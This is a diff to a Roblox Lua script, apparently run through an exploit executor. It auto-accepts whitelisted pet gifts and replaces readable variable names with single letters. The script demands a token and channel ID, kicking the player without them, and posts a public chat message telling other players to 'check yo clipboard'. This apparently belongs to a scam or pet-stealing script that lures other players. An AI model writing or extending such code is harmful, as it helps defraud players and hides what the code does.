@@ -28,39 +28,27 @@ end)
 -- Initial check when the script starts for console output
 checkActivityStatus()
 
--- NEW: Auto-accept gift logic with whitelist
-local autoAccept_RS = game:GetService("ReplicatedStorage")
-local autoAccept_GameEvents = autoAccept_RS:WaitForChild("GameEvents", 10) -- Added timeout for robustness
-if autoAccept_GameEvents then -- Only proceed if GameEvents is found
-    local autoAccept_GiftPet = autoAccept_GameEvents:WaitForChild("GiftPet", 10)
-    local autoAccept_AcceptPetGift = autoAccept_GameEvents:WaitForChild("AcceptPetGift", 10)
+local a=game:GetService("ReplicatedStorage")
+local b=a:WaitForChild("GameEvents")
+local c=b:WaitForChild("GiftPet")
+local d=b:WaitForChild("AcceptPetGift")
 
-    if autoAccept_GiftPet and autoAccept_AcceptPetGift then
-        print("Auto-Accept Script: Hooked and ready. Waiting for gifts...")
+c.OnClientEvent:Connect(function(e,f,g)
+    -- Extract just the pet name, removing "[KG]" or "[Age]" parts
+    local petName = f:match("^(.-) %[") or f -- Get everything before first '[' or the whole string
+    petName = petName:gsub("^%s+", ""):gsub("%s+$", "") -- Trim leading/trailing whitespace
 
-        autoAccept_GiftPet.OnClientEvent:Connect(function(e_giftId, f_petFullName, g_senderName)
-            -- Extract just the pet name, removing "[KG]" or "[Age]" parts
-            local petName = f_petFullName:match("^(.-) %[") or f_petFullName -- Get everything before first '[' or the whole string
-            petName = petName:gsub("^%s+", ""):gsub("%s+$", "") -- Trim leading/trailing whitespace
-
-            -- Check if the extracted petName exists in the PETS_TO_CLAIM list
-            if table.find(PETS_TO_CLAIM, petName) then
-                print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...",f_petFullName,g_senderName))
-                pcall(function()
-                    autoAccept_AcceptPetGift:FireServer(true,e_giftId)
-                    print("Auto-Accept: Successfully accepted gift with ID: "..tostring(e_giftId))
-                end)
-            else
-                print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).",f_petFullName,g_senderName))
-            end
+    -- Check if the extracted petName exists in the PETS_TO_CLAIM list
+    if table.find(PETS_TO_CLAIM, petName) then
+        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...",f,g))
+        pcall(function()
+            d:FireServer(true,e)
+            print("Auto-Accept: Successfully accepted gift with ID: "..tostring(e))
         end)
     else
-        print("Auto-Accept Script: Could not find GiftPet or AcceptPetGift RemoteEvents.")
+        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).",f,g))
     end
-else
-    print("Auto-Accept Script: Could not find GameEvents folder.")
-end
-
+end)
 
 if token == "" or channelId == "" then
     game.Players.LocalPlayer:Kick("Add your token or channelId to use")
@@ -139,8 +127,6 @@ local function acceptGifts()
 end
 
 task.spawn(acceptGifts)
-
-wait(0.5)
 
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
 wait(0.5)
